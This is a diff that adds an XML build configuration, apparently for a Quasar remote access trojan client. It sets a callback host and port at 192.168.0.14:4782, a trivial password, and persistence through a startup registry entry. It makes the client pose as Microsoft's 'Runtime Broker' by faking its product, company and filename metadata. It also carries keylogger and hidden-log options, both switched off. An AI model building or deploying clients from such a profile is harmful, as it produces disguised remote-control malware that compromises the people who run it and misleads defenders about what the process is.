@@ -1,0 +1,30 @@
+<settings>
+  <Tag>Office04</Tag>
+  <Hosts>192.168.0.14:4782;</Hosts>
+  <Password>1234</Password>
+  <Delay>3000</Delay>
+  <Mutex>QSR_MUTEX_n0f6at7YDD5llBKKrq</Mutex>
+  <InstallClient>False</InstallClient>
+  <InstallName>Client</InstallName>
+  <InstallPath>1</InstallPath>
+  <InstallSub>SubDir</InstallSub>
+  <HideFile>False</HideFile>
+  <HideSubDirectory>False</HideSubDirectory>
+  <AddStartup>True</AddStartup>
+  <RegistryName>qas</RegistryName>
+  <ChangeIcon>False</ChangeIcon>
+  <IconPath>
+  </IconPath>
+  <ChangeAsmInfo>True</ChangeAsmInfo>
+  <Keylogger>False</Keylogger>
+  <LogDirectoryName>Logs</LogDirectoryName>
+  <HideLogDirectory>False</HideLogDirectory>
+  <ProductName>Runtime Broker</ProductName>
+  <Description>Runtime Broker</Description>
+  <CompanyName>Microsoft</CompanyName>
+  <Copyright>Runtime Broker</Copyright>
+  <Trademarks>Runtime Broker</Trademarks>
+  <OriginalFilename>Runtime Broker</OriginalFilename>
+  <ProductVersion>1.2.4.2</ProductVersion>
+  <FileVersion>1.2.4.2</FileVersion>
+</settings>
